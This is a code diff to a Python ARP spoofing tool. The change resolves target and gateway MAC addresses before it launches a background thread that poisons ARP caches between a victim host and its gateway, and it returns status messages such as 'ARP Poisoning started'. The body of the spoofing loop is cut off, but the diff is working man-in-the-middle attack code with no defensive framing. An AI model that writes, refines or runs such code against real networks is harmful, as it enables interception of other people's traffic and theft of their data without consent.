@@ -227,21 +227,14 @@ def get_mac(ip):
         if result:
             return result[0][1].hwsrc
         return None
-    except Exception:
+    except Exception as e:
+        print(f"[!] get_mac error for {ip}: {e}")
         return None
 
-def arp_spoof_loop(target_ip, gateway_ip):
+def arp_spoof_loop(target_ip, target_mac, gateway_ip, gateway_mac):
     global spoofing_active
     
-    target_mac = get_mac(target_ip)
-    gateway_mac = get_mac(gateway_ip)
-    
-    if not target_mac or not gateway_mac:
-        print(f"[-] Could not get MAC address. Target: {target_mac}, Gateway: {gateway_mac}")
-        spoofing_active = False
-        return
-
-    print(f"[+] Starting ARP Spoof. Target: {target_ip} ({target_mac}) <-> Gateway: {gateway_ip} ({gateway_mac})")
+    print(f"[+] Starting ARP Spoof Loop. Target: {target_ip} ({target_mac}) <-> Gateway: {gateway_ip} ({gateway_mac})")
     
     try:
         while spoofing_active:
@@ -264,9 +257,20 @@ def start_arp_spoof(target_ip, gateway_ip):
     
     if spoofing_active:
         return {"status": "error", "message": "ARP Spoofing is already active."}
+    
+    # Resolve MACs BEFORE starting thread
+    print(f"[*] Resolving MACs for {target_ip} and {gateway_ip}...")
+    target_mac = get_mac(target_ip)
+    gateway_mac = get_mac(gateway_ip)
+    
+    if not target_mac:
+        return {"status": "error", "message": f"Could not find MAC for Target {target_ip}. Is it reachable?"}
+    
+    if not gateway_mac:
+        return {"status": "error", "message": f"Could not find MAC for Gateway {gateway_ip}. Is it reachable?"}
         
     spoofing_active = True
-    spoof_thread = threading.Thread(target=arp_spoof_loop, args=(target_ip, gateway_ip), daemon=True)
+    spoof_thread = threading.Thread(target=arp_spoof_loop, args=(target_ip, target_mac, gateway_ip, gateway_mac), daemon=True)
     spoof_thread.start()
     
     return {"status": "success", "message": f"ARP Poisoning started on {target_ip} <-> {gateway_ip}"}
